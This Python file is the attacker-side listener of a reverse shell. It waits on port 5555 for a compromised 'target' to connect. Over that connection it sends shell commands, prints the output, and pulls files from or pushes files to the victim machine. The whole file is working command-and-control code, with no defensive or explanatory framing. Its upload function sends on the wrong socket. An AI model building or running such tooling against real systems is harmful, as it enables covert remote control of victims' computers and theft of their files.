import os
import socket
import json

SERVER_IP = '192.168.18.18'
MAX_CONNECTION_COUNT = 5
SERVER_PORT = 5555
CHUNK_BYTES = 1024
WRITE_BYTES = 'wb'
READ_BYTES = 'rb'


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data += target.recv(CHUNK_BYTES).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(file_name):
    f = open(file_name, WRITE_BYTES)
    target.settimeout(1)
    chunk = target.recv(CHUNK_BYTES)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(CHUNK_BYTES)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def upload_file(file_name):
    f = open(file_name, READ_BYTES)
    sock.send(f.read())


def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system(command)
        elif command[:3] == 'cd ':
            pass
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        else:
            result = reliable_recv()
            print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((SERVER_IP, SERVER_PORT))
print('[+] Listening for the incoming connections on port: ' + str(SERVER_PORT))
sock.listen(MAX_CONNECTION_COUNT)

target, ip = sock.accept()
print('[+] Target connected from: ' + str(ip))
target_communication()
